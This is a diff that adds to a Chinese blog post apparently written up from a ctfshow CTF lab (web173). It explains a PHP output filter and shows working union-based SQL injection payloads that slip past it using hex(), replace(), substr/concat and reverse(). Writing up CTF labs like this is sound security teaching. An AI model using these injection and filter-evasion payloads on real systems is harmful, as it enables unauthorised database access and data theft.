@@ -3,7 +3,7 @@ title: "ctfshow-WEB入门（sql注入）"
 description: "ctfshow-WEB入门（sql注入）"
 image: "/assets/光下的西施.jpg"
 date: 2026-11-25
-updated: 2026-11-27
+updated: 2026-11-28
 categories:
   - 学习
 tags:
@@ -540,3 +540,221 @@ if($row->username !== 'flag'){
 ![image-20261127224910090](/assets/ctfshow-web-sqli/image-20261127224910090.png)
 
 `FLAG !== flag`，检查同样通过。
+
+### web173
+
+上一题是`过滤注入2`，那么这一题当然是`过滤注入3`页面进行sql注入啦
+
+![image-20261128095538395](/assets/ctfshow-web-sqli/image-20261128095538395.png)
+
+#### php代码逻辑
+
+```
+//检查结果是否有flag
+if(!preg_match('/flag/i', json_encode($ret))){
+  $ret['msg']='查询成功';
+}
+```
+
+这是一段**输出黑名单过滤**代码：
+
+**1. `json_encode($ret)`**
+
+`$ret` 是一个数组（查询结果），`json_encode` 把整个数组转成 JSON 字符串，比如：
+
+```php
+$ret = ['id'=>1,'data'=>'flag{abc}'];
+// 转成：{"id":1,"data":"flag{abc}"}
+```
+
+这样不管 flag 出现在数组的**键名还是值**里，都会被搜到。
+
+**2. `preg_match('/flag/i', ...)`**
+
+正则匹配：
+
+- `flag`：要找的字符串
+- 两个 `/` 是正则的分隔符
+- `i`：**不区分大小写**，所以 `flag`、`FLAG`、`Flag`、`fLaG` 全部能匹配上
+- 返回值：匹配到返回 `1`，没匹配到返回 `0`，出错返回 `false`
+
+**3. 前面的 `!`（取反）**
+
+`!preg_match(...)` 的意思是：**结果里没有 "flag" 这个词时，条件才成立**。
+
+**4. 整体逻辑**
+
+- 结果里**不含** flag → 正常设置 `$ret['msg'] = '查询成功'`，数据正常返回
+- 结果里**含** flag → 不进 if，不设置成功提示（通常配合其他逻辑，把结果拦截或吞掉）
+
+#### 探测
+
+```
+1' order by 3--+   -> 正常
+1' order by 4--+   -> 报错      => 3 列
+-1' union select 1,2,3--+  -> {"id":"1","username":"2","password":"3"}
+```
+
+![image-20261128100508604](/assets/ctfshow-web-sqli/image-20261128100508604.png)
+
+![image-20261128100601848](/assets/ctfshow-web-sqli/image-20261128100601848.png)
+
+![image-20261128100704596](/assets/ctfshow-web-sqli/image-20261128100704596.png)
+
+#### payload作用层
+
+一次请求从发出到收到回复，中间有四个位置可以放“检查”，同一个 payload 在不同层的效果完全不同：
+
+```
+浏览器输入
+   ↓
+① 输入侧检查（对传参：你发来的字符串）
+   ↓
+② SQL 执行（数据库本身的规则，不算"过滤"但会拦）
+   ↓
+③ 结果处理（PHP 逐行检查查出来的数据）
+   ↓
+④ 输出侧检查（对最终响应的整体文本）
+   ↓
+浏览器收到
+```
+
+- **① 输入侧**：查“你说了什么”——WAF 拦 `select`、转义引号、删关键字都属于这层。171~173 都没有这层，所以 payload 里写 `username='flag'` 畅通无阻
+- **② SQL 执行**：数据库自己的规则——union 列数不匹配、语法错误都会被拦，`order by` 数列数试的就是这层
+- **③ 结果处理**：查“查出来的每一行”——web172 的 `username !== 'flag'` 逐行丢行就是这层
+- **④ 输出侧**：查“最终发出去的整段文本”——web173 的 `/flag/i` 扫整个 JSON 就是这层
+
+#### 五种绕过（让输出里不出现连续的 f-l-a-g）
+
+检查器扫的是**最终 JSON 文本**，发回浏览器的文本里，不能出现连续的 f、l、a、g 四个字母（任何大小写）。
+
+哪些内容会进这段 JSON？
+
+| 列 | 内容 | 会不会触发 |
+|---|---|---|
+| id | 数字（1、26…） | 不会 |
+| username | flag 行的值是 `'flag'` | **会，唯一触发点** |
+| password | `ctfshow{uuid}` | 不会（uuid 里没有 flag 字样） |
+
+所以正则只看“回显出来的文本长什么样”，不看“数据库里真实存的是什么”。数据没变，变的是表示形式——四个 payload 靠的都是这一点。
+
+##### username 位填常量，只回 password
+
+```
+-1' union select 1,2,password from ctfshow_user3 where username='flag'--+
+```
+
+union 后半句是 `select 1,2,password ... where username='flag'`：数据库里筛出的那行是 `(26, 'flag', 'ctfshow{...}')`，但 SELECT 列表里**根本没有 username**，第二列用常量 `2` 占位。所以返回行是 `(1, 2, 'ctfshow{...}')`，JSON 里没有 f-l-a-g → 放行，flag 在 password 列原样拿到。
+
+生效原因：**不回显那个会触发检查的字段，用常量占位。**
+
+![image-20261128103741064](/assets/ctfshow-web-sqli/image-20261128103741064.png)
+
+##### hex 编码：username 变成 666C6167
+
+```
+-1' union select id,hex(username),password from ctfshow_user3 where username='flag'--+
+```
+
+`hex()` 是 MySQL 内置函数，把字符串转成十六进制：
+
+```
+f → 66
+l → 6C
+a → 61
+g → 67
+
+hex('flag') = '666C6167'
+```
+
+返回行变成 `(26, '666C6167', 'ctfshow{...}')`，JSON 里 username 是一串十六进制字符，正则匹配不到 → 放行。拿到 `666C6167` 就等于拿到了 flag。
+
+生效原因：**hex 是可逆编码。数据还是那个数据，只是换了一种文本表示；正则匹配的是文本，表示变了它就“瞎”了。**
+
+![image-20261128103850023](/assets/ctfshow-web-sqli/image-20261128103850023.png)
+
+
+
+##### 字符替换：glag
+
+```
+-1' union select id,replace(username,'f','g'),password from ctfshow_user3 where username='flag'--+
+```
+
+`replace('flag','f','g')` = `'glag'`，f-l-a-g 的连续序列被破坏成 g-l-a-g，正则匹配不上 → 放行。
+
+![image-20261128103921710](/assets/ctfshow-web-sqli/image-20261128103921710.png)
+
+##### substr 拆开分家：f 和 lag 分开放
+
+```
+-1' union select id,substr(username,1,1),concat(substr(username,2),password) from ctfshow_user3 where username='flag'--+
+```
+
+![image-20261128122114133](/assets/ctfshow-web-sqli/image-20261128122114133.png)
+
+先看 substr 到底切了什么。username 的值是 flag，一共 4 个字符：
+
+```
+位置:  1    2    3    4
+字符:  f    l    a    g
+```
+
+- `substr(username,1,1)`：从第 1 位取 1 个 → `f`
+- `substr(username,2)`：从第 2 位取到结尾 → `lag`
+
+payload 里这两半的去向：f 放进 username 列，lag 拼到 password 前面，所以返回行是 `(26, 'f', 'lagctfshow{...}')`。
+
+对比两种情况下实际发出的 JSON 文本。
+
+不拆分时（假设后端不做检查），JSON 会是这样：
+
+```
+{"code":0,"msg":"查询成功","count":1,"data":[{"id":"26","username":"flag","password":"ctfshow{...}"}]}
+                              这里^^^^直接就是连续的 f-l-a-g → 正则命中 → 被拦
+```
+
+拆分后的实测原文：
+
+```
+{"code":0,"msg":"查询成功","count":1,"data":[{"id":"26","username":"f","password":"lagctfshow{57f8b111-4f83-42ab-b97f-8820174adcc1}"}]}
+```
+
+把拆分后的文本逐字排开，看 f 的后面是什么：
+
+```
+... " u s e r n a m e " : " f  "  ,  "  p  a  s  s  w  o  r  d  "  :  "  l  a  g  c  t  f  s  h  o  w  { ...
+                         ↑                        ↑
+                      f 在这里                 lag 在这里
+```
+
+- f 的下一个字符是引号，不是 l → 匹配在这里断掉
+- lag 的前面是引号，不是 f → 也凑不成
+- f 和 l 中间隔着 `","password":"` 这一整串
+
+正则找 flag 的条件是 f 后面紧跟 l、l 后面紧跟 a、a 后面紧跟 g，是连续的f-l-a-g。拆分后的文本里 f 的下一个字符是引号，全文其它地方也没有连续的 f-l-a-g（password 里的 ctfshow 是 c-t-f-s，f 后面跟的是 s），所以 preg_match 找不到匹配，数据放行。
+
+username 列的 f + password 开头的 lag = flag（确认这就是 flag 用户），password 真正的值去掉开头 3 个字符 lag，就是 `ctfshow{...}`。
+
+拆分把一个词的四个字母塞进两个不同的区域，中间隔着 JSON 的引号和键名，正则在整段文本里拼不出 flag 这个词。
+
+另一种切法也行：把 fl 拼到 id 后面，ag 放 username 列：
+
+```
+-1' union select concat(id,substr(username,1,2)),substr(username,3),password from ctfshow_user3 where username='flag'--+
+```
+
+![image-20261128122131215](/assets/ctfshow-web-sqli/image-20261128122131215.png)
+
+1. **两半不能落进同一个字段**：如果用 concat 把两半拼回 `flag` 再放进一列，等于没绕，直接被拦
+2. **片段在 JSON 文本里不能恰好相邻**：好在 JSON 的引号和键名会天然把片段隔开，所以拆开放相邻字段通常也安全
+
+##### 使用reverse逆向username
+
+```
+-1' union select id,reverse(username),password from ctfshow_user3 where username='flag'--+
+```
+
+![image-20261128122425558](/assets/ctfshow-web-sqli/image-20261128122425558.png)
+
+`reverse('flag')` = `'galf'`，四个字母倒着输出。JSON 里只有 galf，正则在整段文本里找不到连续的 f-l-a-g → 放行；拿到 `galf` 倒着读就是 flag，信息没丢。
